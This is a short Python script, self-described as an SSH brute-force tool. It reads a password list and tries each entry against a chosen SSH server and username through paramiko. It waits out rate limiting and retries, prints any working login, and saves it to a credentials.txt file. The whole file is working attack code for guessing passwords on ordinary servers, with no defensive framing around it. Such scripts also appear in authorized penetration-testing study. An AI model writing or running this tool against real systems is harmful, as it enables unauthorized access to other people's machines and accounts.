import paramiko
import socket
import time
from colorama import init, Fore

# Init colorama for colored output
init()
GREEN = Fore.GREEN
RED = Fore.RED  
RESET = Fore.RESET  
BLUE = Fore.BLUE

# Function to check if SSH is open with provided credentials
def is_ssh_open(hostname, username, password):
    # Initialize SSH client
    client = paramiko.SSHClient()
    # Add the host to known hosts (auto add if not present)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # Try to connect to the SSH server
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # Host is unreachable (timed out)
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        # Invalid credentials
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        # Quota exceeded, retrying with a delay
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # Sleep for a minute before retrying
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # Connection established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True
    
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contains a password list with each password on a new line.")
    parser.add_argument("-u", "--user", help="Host username")
    
    # Parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    
    # Read the password file
    passlist = open(passlist).read().splitlines()
    
    # Bruteforce
    for password in passlist:
        if is_ssh_open(host, user, password):
            # If combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break
